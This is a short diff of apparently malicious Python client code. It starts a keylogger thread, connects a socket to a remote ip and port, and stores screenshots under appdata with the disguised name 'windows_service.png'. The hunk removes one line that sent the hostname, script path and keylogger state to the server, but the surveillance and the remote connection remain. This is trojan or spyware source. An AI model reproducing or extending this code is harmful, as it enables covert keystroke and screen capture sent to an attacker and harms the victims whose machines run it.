@@ -14,15 +14,14 @@ from sys import _MEIPASS
 key = kizagan_key.kizagan_key()
 key_thread = threading.Thread(target=key.start_key)
 key_thread.start()
-key_state = "true"
+
 
 
 class Client():
     def __init__(self):
         connection = socket.socket()
         connection.connect((ip, port))
-        some_data = socket.gethostname() + ":delimiter:" + os.path.abspath(__file__) + ":delimiter:" + key_state
-        connection.send(some_data.encode())
+        
         self.connection = connection
         if os.name == "nt":
             self.ss_path = os.environ["appdata"] + "\\windows_service.png"
